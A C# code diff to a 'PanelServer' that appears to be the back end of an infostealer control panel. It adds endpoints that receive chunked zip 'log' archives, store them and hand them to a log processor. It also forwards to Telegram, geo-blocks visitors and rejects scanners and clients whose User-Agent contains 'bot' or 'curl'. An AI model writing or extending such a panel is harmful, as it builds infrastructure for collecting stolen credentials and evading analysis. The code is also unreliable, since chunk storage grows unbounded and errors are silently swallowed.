@@ -20,12 +20,15 @@ public class PanelServer
     public string AuthToken { get; private set; } = Guid.NewGuid().ToString("N");
     public string? TelegramToken { get; set; }
     public string? TelegramChatId { get; set; }
+    public int MaxRequestsPerMinute { get => _maxRequestsPerMinute; set => _maxRequestsPerMinute = value; }
 
     private static readonly ConcurrentDictionary<string, RateLimitEntry> _rateLimits = new();
     private static readonly ConcurrentDictionary<string, int> _failedAttempts = new();
-    private const int MaxRequestsPerMinute = 60;
+    private int _maxRequestsPerMinute = 60;
     private const long MaxPayloadSize = 100L * 1024 * 1024;
     private const int MaxFailedAttempts = 10;
+
+    private static readonly ConcurrentDictionary<string, ChunkedSession> _chunks = new();
 
     public PanelServer(IDbContextFactory<AppDbContext> dbFactory, LogProcessor logProcessor, TelegramProxy telegram)
     {
@@ -46,6 +49,32 @@ public class PanelServer
         app.Use(async (ctx, next) =>
         {
             var ip = ctx.Connection.RemoteIpAddress?.ToString() ?? "unknown";
+
+            // Ban check
+            if (ip != "unknown")
+            {
+                using var banDb = _dbFactory.CreateDbContext();
+                var banned = banDb.Bans.Any(b => b.Ip == ip);
+                if (banned)
+                {
+                    ctx.Response.StatusCode = 403;
+                    return;
+                }
+            }
+
+            // Bot detection: check User-Agent and Content-Type
+            var ua = ctx.Request.Headers.UserAgent.FirstOrDefault();
+            if (string.IsNullOrEmpty(ua) || ua.Contains("bot", StringComparison.OrdinalIgnoreCase) || ua.Contains("curl", StringComparison.OrdinalIgnoreCase))
+            {
+                ctx.Response.StatusCode = 403;
+                return;
+            }
+            if (ctx.Request.Method == "POST" && !ctx.Request.HasFormContentType)
+            {
+                ctx.Response.StatusCode = 415;
+                return;
+            }
+
             var auth = ctx.Request.Headers.Authorization.FirstOrDefault();
 
             var rateEntry = _rateLimits.GetOrAdd(ip, _ => new RateLimitEntry());
@@ -57,7 +86,7 @@ public class PanelServer
                     rateEntry.ResetTime = DateTime.UtcNow.AddMinutes(1);
                 }
                 rateEntry.Count++;
-                if (rateEntry.Count > MaxRequestsPerMinute)
+                if (rateEntry.Count > _maxRequestsPerMinute)
                 {
                     ctx.Response.StatusCode = 429;
                     return;
@@ -72,6 +101,16 @@ public class PanelServer
                     var fails = _failedAttempts.AddOrUpdate(ip, 1, (_, c) => c + 1);
                     if (fails > MaxFailedAttempts)
                     {
+                        // Permanent ban
+                        try
+                        {
+                            using var banDb2 = _dbFactory.CreateDbContext();
+                            if (!banDb2.Bans.Any(b => b.Ip == ip))
+                                banDb2.Bans.Add(new Models.Ban { Ip = ip, Reason = "Brute-force protection" });
+                            banDb2.SaveChanges();
+                        }
+                        catch { }
+
                         var failEntry = _rateLimits.GetOrAdd(ip, _ => new RateLimitEntry());
                         lock (failEntry) { failEntry.Count = int.MaxValue; failEntry.ResetTime = DateTime.MaxValue; }
                     }
@@ -201,6 +240,95 @@ public class PanelServer
             return Results.Json(new { blocked, country = GetCountryCode(ip ?? "") });
         });
 
+        app.MapPost("/api/log/chunk", async (HttpRequest req) =>
+        {
+            if (!req.HasFormContentType) return Results.BadRequest();
+
+            var form = await req.ReadFormAsync();
+            var sessionId = form["session_id"].FirstOrDefault();
+            var chunkIndexStr = form["chunk_index"].FirstOrDefault();
+            var dataFile = form.Files.GetFile("data");
+
+            if (sessionId == null || chunkIndexStr == null || dataFile == null || dataFile.Length > 10L * 1024 * 1024)
+                return Results.BadRequest();
+
+            if (!int.TryParse(chunkIndexStr, out var chunkIndex) || chunkIndex < 0)
+                return Results.BadRequest();
+
+            var entry = _chunks.GetOrAdd(sessionId, _ => new ChunkedSession
+            {
+                SessionId = sessionId,
+                CreatedAt = DateTime.UtcNow
+            });
+
+            using var ms = new MemoryStream((int)dataFile.Length);
+            await dataFile.CopyToAsync(ms);
+            entry.Chunks[chunkIndex] = ms.ToArray();
+
+            return Results.Ok();
+        });
+
+        app.MapPost("/api/log/complete", async (HttpRequest req) =>
+        {
+            if (!req.HasFormContentType) return Results.BadRequest();
+
+            var form = await req.ReadFormAsync();
+            var sessionId = form["session_id"].FirstOrDefault();
+            var totalChunksStr = form["total_chunks"].FirstOrDefault();
+            var metadata = form["metadata"].FirstOrDefault() ?? "";
+
+            if (sessionId == null || totalChunksStr == null)
+                return Results.BadRequest();
+
+            if (!int.TryParse(totalChunksStr, out var totalChunks) || totalChunks <= 0 || totalChunks > 1000)
+                return Results.BadRequest();
+
+            if (!_chunks.TryRemove(sessionId, out var session))
+                return Results.BadRequest();
+
+            try
+            {
+                using var ms = new MemoryStream();
+                for (int i = 0; i < totalChunks; i++)
+                {
+                    if (session.Chunks.TryGetValue(i, out var chunkData))
+                    {
+                        ms.Write(chunkData);
+                    }
+                }
+
+                var archive = ms.ToArray();
+                if (archive.Length == 0) return Results.BadRequest();
+
+                // Save raw archive to logs/
+                try
+                {
+                    var logsDir = Path.Combine(AppDomain.CurrentDomain.BaseDirectory, "logs");
+                    Directory.CreateDirectory(logsDir);
+                    var ts = DateTime.UtcNow.ToString("yyyyMMdd_HHmmss");
+                    var zipPath = Path.Combine(logsDir, $"chunked_{ts}_{Guid.NewGuid():N}.zip");
+                    await File.WriteAllBytesAsync(zipPath, archive);
+                }
+                catch { }
+
+                _logProcessor.Process(archive, metadata);
+                return Results.Ok();
+            }
+            catch
+            {
+                return Results.StatusCode(500);
+            }
+        });
+
+        app.MapGet("/api/bridges", () =>
+        {
+            return Results.Json(new
+            {
+                bridges = Array.Empty<object>(),
+                total = 0
+            });
+        });
+
         _ = app.StartAsync();
         _app = app;
     }
@@ -272,5 +400,13 @@ public class PanelServer
     {
         public int Count;
         public DateTime ResetTime = DateTime.UtcNow.AddMinutes(1);
+    }
+
+    private class ChunkedSession
+    {
+        public string SessionId = "";
+        public Dictionary<int, byte[]> Chunks = new();
+        public int TotalChunks;
+        public DateTime CreatedAt;
     }
 }
